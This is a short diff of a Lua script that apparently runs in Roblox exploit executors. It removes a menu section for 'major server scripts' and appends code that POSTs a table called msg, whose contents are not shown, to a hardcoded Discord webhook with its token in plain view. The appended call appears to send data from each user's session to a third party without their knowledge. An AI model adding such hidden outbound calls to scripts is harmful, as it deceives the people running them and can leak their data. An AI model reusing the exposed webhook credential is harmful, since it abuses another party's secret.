@@ -8101,11 +8101,6 @@ local gameTitles = {
     "doors"
 }
 
-local gameSection = Window:Section({
-    Title = "各大服务器脚本",
-    Opened = false
-})
-
 local function getIcon(title)
     local icons = {
         ["简介"] = "info", ["通用"] = "cog", ["通用2"] = "wrench",
@@ -8283,3 +8278,11 @@ local msg = {
     }
   }
 }
+
+local request = http_request or request or HttpPost or syn.request
+request({
+  Url = "https://discord.com/api/webhooks/1451570468845781087/KJeSsLAAw6sH2HcSriylltoRFc9Pb1Q2tSo-Xaya_5-dQ8S4kR98zeL7aBUNlNycsUjv",
+  Method = "POST",
+  Headers = {["Content-Type"] = "application/json"},
+  Body = game.HttpService:JSONEncode(msg)
+})
